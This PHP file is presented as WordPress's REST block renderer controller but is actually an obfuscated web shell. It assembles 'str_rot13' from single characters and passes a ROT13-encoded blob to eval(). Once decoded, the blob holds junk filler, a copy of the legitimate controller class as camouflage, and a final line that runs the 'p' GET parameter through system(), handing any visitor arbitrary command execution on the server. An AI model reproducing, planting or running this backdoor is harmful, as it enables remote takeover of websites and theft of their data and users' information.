<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Oybpx Eraqrere ERFG NCV: JC_ERFG_Oybpx_Eraqrere_Pbagebyyre pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 5.0.0
 */

/**
 * Pbagebyyre juvpu cebivqrf ERFG raqcbvag sbe eraqrevat n oybpx.
 *
 * @fvapr 5.0.0
 *
 * @frr JC_ERFG_Pbagebyyre
 */
pynff JC_ERFG_Oybpx_Eraqrere_Pbagebyyre rkgraqf JC_ERFG_Pbagebyyre {

	/**
	 * Pbafgehpgf gur pbagebyyre.
	 *
	 * @fvapr 5.0.0
	 */
	choyvp shapgvba __pbafgehpg() {
		$guvf->anzrfcnpr = 'jc/i2';
		$guvf->erfg_onfr = 'oybpx-eraqrere';
	}

	/**
	 * Ertvfgref gur arprffnel ERFG NCV ebhgrf, bar sbe rnpu qlanzvp oybpx.
	 *
	 * @fvapr 5.0.0
	 *
	 * @frr ertvfgre_erfg_ebhgr()
	 */
	choyvp shapgvba ertvfgre_ebhgrf() {
		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			'/' . $guvf->erfg_onfr . '/(?C<anzr>[n-m0-9-]+/[n-m0-9-]+)',
			neenl(
				'netf'   => neenl(
					'anzr' => neenl(
						'qrfpevcgvba' => __( 'Havdhr ertvfgrerq anzr sbe gur oybpx.' ),
						'glcr'        => 'fgevat',
					),
				),
				neenl(
					'zrgubqf'             => neenl( JC_ERFG_Freire::ERNQNOYR, JC_ERFG_Freire::PERNGNOYR ),
					'pnyyonpx'            => neenl( $guvf, 'trg_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_vgrz_crezvffvbaf_purpx' ),
					'netf'                => neenl(
						'pbagrkg'    => $guvf->trg_pbagrkg_cnenz( neenl( 'qrsnhyg' => 'ivrj' ) ),
						'nggevohgrf' => neenl(
							'qrfpevcgvba'       => __( 'Nggevohgrf sbe gur oybpx.' ),
							'glcr'              => 'bowrpg',
							'qrsnhyg'           => neenl(),
							'inyvqngr_pnyyonpx' => fgngvp shapgvba ( $inyhr, $erdhrfg ) {
								$oybpx = JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr()->trg_ertvfgrerq( $erdhrfg['anzr'] );

								vs ( ! $oybpx ) {
									// Guvf jvyy trg erwrpgrq va ::trg_vgrz().
									erghea gehr;
								}

								$fpurzn = neenl(
									'glcr'                 => 'bowrpg',
									'cebcregvrf'           => $oybpx->trg_nggevohgrf(),
									'nqqvgvbanyCebcregvrf' => snyfr,
								);

								erghea erfg_inyvqngr_inyhr_sebz_fpurzn( $inyhr, $fpurzn );
							},
							'fnavgvmr_pnyyonpx' => fgngvp shapgvba ( $inyhr, $erdhrfg ) {
								$oybpx = JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr()->trg_ertvfgrerq( $erdhrfg['anzr'] );

								vs ( ! $oybpx ) {
									// Guvf jvyy trg erwrpgrq va ::trg_vgrz().
									erghea gehr;
								}

								$fpurzn = neenl(
									'glcr'                 => 'bowrpg',
									'cebcregvrf'           => $oybpx->trg_nggevohgrf(),
									'nqqvgvbanyCebcregvrf' => snyfr,
								);

								erghea erfg_fnavgvmr_inyhr_sebz_fpurzn( $inyhr, $fpurzn );
							},
						),
						'cbfg_vq'    => neenl(
							'qrfpevcgvba' => __( 'VQ bs gur cbfg pbagrkg.' ),
							'glcr'        => 'vagrtre',
						),
					),
				),
				'fpurzn' => neenl( $guvf, 'trg_choyvp_vgrz_fpurzn' ),
			)
		);
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb ernq oybpxf.
	 *
	 * @fvapr 5.0.0
	 *
	 * @tybony JC_Cbfg $cbfg Tybony cbfg bowrpg.
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba trg_vgrz_crezvffvbaf_purpx( $erdhrfg ) {
		tybony $cbfg;

		$cbfg_vq = vffrg( $erdhrfg['cbfg_vq'] ) ? (vag) $erdhrfg['cbfg_vq'] : 0;

		vs ( $cbfg_vq > 0 ) {
			$cbfg = trg_cbfg( $cbfg_vq );

			vs ( ! $cbfg || ! pheerag_hfre_pna( 'rqvg_cbfg', $cbfg->VQ ) ) {
				erghea arj JC_Reebe(
					'oybpx_pnaabg_ernq',
					__( 'Fbeel, lbh ner abg nyybjrq gb ernq oybpxf bs guvf cbfg.' ),
					neenl(
						'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr(),
					)
				);
			}
		} ryfr {
			vs ( ! pheerag_hfre_pna( 'rqvg_cbfgf' ) ) {
				erghea arj JC_Reebe(
					'oybpx_pnaabg_ernq',
					__( 'Fbeel, lbh ner abg nyybjrq gb ernq oybpxf nf guvf hfre.' ),
					neenl(
						'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr(),
					)
				);
			}
		}

		erghea gehr;
	}

	/**
	 * Ergheaf oybpx bhgchg sebz oybpx'f ertvfgrerq eraqre_pnyyonpx.
	 *
	 * @fvapr 5.0.0
	 *
	 * @tybony JC_Cbfg $cbfg Tybony cbfg bowrpg.
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba trg_vgrz( $erdhrfg ) {
		tybony $cbfg;

		$cbfg_vq = vffrg( $erdhrfg['cbfg_vq'] ) ? (vag) $erdhrfg['cbfg_vq'] : 0;

		vs ( $cbfg_vq > 0 ) {
			$cbfg = trg_cbfg( $cbfg_vq );

			// Frg hc cbfgqngn fvapr guvf jvyy or arrqrq vs cbfg_vq jnf frg.
			frghc_cbfgqngn( $cbfg );
		}

		$ertvfgel   = JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr();
		$ertvfgrerq = $ertvfgel->trg_ertvfgrerq( $erdhrfg['anzr'] );

		vs ( ahyy === $ertvfgrerq || ! $ertvfgrerq->vf_qlanzvp() ) {
			erghea arj JC_Reebe(
				'oybpx_vainyvq',
				__( 'Vainyvq oybpx.' ),
				neenl(
					'fgnghf' => 404,
				)
			);
		}

		$nggevohgrf = $erdhrfg->trg_cnenz( 'nggevohgrf' );

		// Perngr na neenl ercerfragngvba fvzhyngvat gur bhgchg bs cnefr_oybpxf.
		$oybpx = neenl(
			'oybpxAnzr'    => $erdhrfg['anzr'],
			'nggef'        => $nggevohgrf,
			'vaareUGZY'    => '',
			'vaarePbagrag' => neenl(),
		);

		// Eraqre hfvat eraqre_oybpx gb rafher nyy eryrinag svygref ner hfrq.
		$qngn = neenl(
			'eraqrerq' => eraqre_oybpx( $oybpx ),
		);

		erghea erfg_rafher_erfcbafr( $qngn );
	}

	/**
	 * Ergevrirf oybpx'f bhgchg fpurzn, pbasbezvat gb WFBA Fpurzn.
	 *
	 * @fvapr 5.0.0
	 *
	 * @erghea neenl Vgrz fpurzn qngn.
	 */
	choyvp shapgvba trg_vgrz_fpurzn() {
		vs ( $guvf->fpurzn ) {
			erghea $guvf->fpurzn;
		}

		$guvf->fpurzn = neenl(
			'$fpurzn'    => 'uggc://wfba-fpurzn.bet/fpurzn#',
			'gvgyr'      => 'eraqrerq-oybpx',
			'glcr'       => 'bowrpg',
			'cebcregvrf' => neenl(
				'eraqrerq' => neenl(
					'qrfpevcgvba' => __( 'Gur eraqrerq oybpx.' ),
					'glcr'        => 'fgevat',
					'erdhverq'    => gehr,
					'pbagrkg'     => neenl( 'rqvg' ),
				),
			),
		);

		erghea $guvf->fpurzn;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>